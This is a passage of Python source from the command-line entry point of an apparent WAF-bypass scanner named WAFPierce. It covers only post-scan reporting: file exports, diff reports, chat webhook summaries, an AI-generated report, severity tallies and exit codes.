                print(f"[!] Export failed: {e}")

        # Standalone diff report against a previous scan's results JSON.
        if args.diff_against:
            try:
                from .exporters import to_html_diff
                with open(args.diff_against, 'r', encoding='utf-8') as f:
                    prev = json.load(f)
                with open(args.diff_out, 'w', encoding='utf-8') as f:
                    f.write(to_html_diff(args.target, prev, out_results))
                print(f"[+] Wrote scan diff to {args.diff_out}")
            except Exception as e:
                print(f"[!] Diff failed: {e}")

        # Push a findings summary to chat integrations.
        for _flag, _sender, _label in (
            (args.slack_webhook, 'send_slack', 'Slack'),
            (args.discord_webhook, 'send_discord', 'Discord'),
            (args.teams_webhook, 'send_teams', 'Teams'),
        ):
            if not _flag:
                continue
            try:
                import wafpierce.integrations as _integ
                if getattr(_integ, _sender)(_flag, args.target, out_results):
                    print(f"[+] Posted findings summary to {_label}")
                else:
                    print(f"[!] {_label} push failed (see logs)")
            except Exception as e:
                logger.debug(f"{_label} push error: {e}")

        # AI-written markdown report.
        if args.ai_report:
            try:
                from .ai_providers import write_report
                md = write_report(args.ai_provider, args.target, out_results,
                                  api_key=args.ai_key, model=args.ai_model,
                                  base_url=args.ai_base_url)
                if md:
                    with open(args.ai_report, 'w', encoding='utf-8') as f:
                        f.write(md)
                    print(f"[+] AI report written to {args.ai_report}")
                else:
                    print(f"[!] AI report skipped ({args.ai_provider} unavailable or returned no report)")
            except Exception as e:
                logger.debug(f"AI report error: {e}")

        # Pipeline mode: emit machine-readable JSON to the real stdout and exit.
        if args.json:
            _emit_json_stdout(out_results)
            if args.output:
                _write_json_atomic(args.output, out_results)
            sys.exit(fail_exit if fail_exit is not None else (
                0 if not any(_is_actionable_result(r) for r in results) else 1
            ))

        # Continuous monitoring: diff against the previous scan of this target.
        if args.monitor:
            try:
                from .database import WAFPierceDB
                from .monitor import monitor_target
                monitor_target(WAFPierceDB(), args.target, webhook_url=args.webhook,
                               session=scanner._session)
            except Exception as e:
                logger.debug(f"Monitor error: {e}")

        # Confirmed findings can fail CI. Candidates remain visible, but are kept
        # separate so an unverified heuristic never changes the process exit code.
        actionable = [r for r in results if _is_actionable_result(r)]
        critical = [r for r in actionable if r.get('severity') == 'CRITICAL']
        high = [r for r in actionable if r.get('severity') == 'HIGH']
        medium = [r for r in actionable if r.get('severity') == 'MEDIUM']
        low = [r for r in actionable if r.get('severity') == 'LOW']
        info = [r for r in actionable if r.get('severity') == 'INFO']
        confirmed = list(actionable)
        candidates = [
            r for r in results
            if bool(r.get('bypass')) and (
                str(r.get('verification_status') or '').lower() == 'candidate'
                or str(r.get('kind') or '').lower() == 'suspected'
            )
        ]
        candidate_ids = {id(r) for r in candidates}
        observations = [
            r for r in results
            if not _is_actionable_result(r) and id(r) not in candidate_ids
        ]
        detections = [r for r in results if r.get('category') in ['WAF_DETECTION', 'CDN_DETECTION', 'API_DISCOVERY']]

        if quiet:
            # One-line, pipe-friendly summary.
            print(f"Found {len(confirmed)} confirmed findings "
                  f"(CRITICAL={len(critical)} HIGH={len(high)} MEDIUM={len(medium)} "
                  f"LOW={len(low)} INFO={len(info)}; confirmed={len(confirmed)} "
                  f"candidates={len(candidates)} observations={len(observations)})")
        else:
            # Emoji decoration unless --no-color / NO_COLOR.
            sev_icon = {
                'summary': '' if no_color else '📊 ',
                'CRITICAL': '[CRIT] ' if no_color else '🔴 ',
                'HIGH': '[HIGH] ' if no_color else '🟠 ',
                'MEDIUM': '[MED]  ' if no_color else '🟡 ',
                'LOW': '[LOW]  ' if no_color else '🔵 ',
                'INFO': '[INFO] ' if no_color else 'ℹ️  ',
                'clean': '[OK] ' if no_color else '✅ ',
            }
            print(f"\n{'='*60}")
            print(f"[+] Scan Complete: {len(confirmed)} confirmed finding(s), "
                  f"{len(candidates)} candidate(s), {len(observations)} observation(s)")
            print(f"{'='*60}\n")

            if actionable or candidates:
                print(f"{sev_icon['summary']}Summary:")
                print(f"   Confirmed: {len(confirmed)}")
                print(f"   Candidates needing verification: {len(candidates)}")
                print(f"   Observations / negative probes: {len(observations)}")
                print(f"   Edge Security Detections: {len(detections)}")
                print()
                for label, group, always_reason in (
                    ('CRITICAL', critical, True), ('HIGH', high, True),
                    ('MEDIUM', medium, True), ('LOW', low, False), ('INFO', info, False),
                ):
                    if not group:
                        continue
                    print(f"\n{sev_icon[label]}{label} ({len(group)}):")
                    for r in group:
                        print(f"  - {r['technique']}")
                        if always_reason or r.get('reason'):
                            print(f"    Reason: {r.get('reason', '')}")
                if candidates:
                    print(f"\n[VERIFY] CANDIDATES ({len(candidates)}):")
                    for r in candidates:
                        print(f"  - {r.get('technique', 'Candidate')}")
                        if r.get('reason'):
                            print(f"    Reason: {r['reason']}")
            else:
                print(f"{sev_icon['clean']}No security finding or candidate was detected")

        # Save results
        if args.output:
            _write_json_atomic(args.output, out_results)
            if not quiet:
                print(f"\n[+] Results saved to {args.output}")

        if fail_exit is not None and not quiet:
            print(f"\n[!] --fail-on {args.fail_on}: threshold met -> exit {fail_exit}")

        # Return appropriate exit code
        sys.exit(fail_exit if fail_exit is not None else (0 if len(actionable) == 0 else 1))
    
    except InvalidTargetError as e:
        print(f"[!] Invalid target: {e}")
        logger.error(f"Invalid target: {e}")
        sys.exit(2)
    
    except BaselineFailedError as e:
        print(f"[!] Baseline failed: {e}")
        logger.error(f"Baseline failed: {e}")
        sys.exit(3)
    
    except TargetUnreachableError as e:
        print(f"[!] Target unreachable: {e}")
        logger.error(f"Target unreachable: {e}")
        sys.exit(4)
    
    except ScanInterruptedError as e:
        print(f"\n[!] Scan interrupted: {e}")
        logger.warning(f"Scan interrupted: {e}")
        sys.exit(130)  # Standard exit code for SIGINT
    
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        logger.warning("Scan interrupted by user (Ctrl+C)")
        sys.exit(130)
    
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        logger.exception("Unexpected error during scan")
        sys.exit(1)


if __name__ == '__main__':
    raise SystemExit(main())
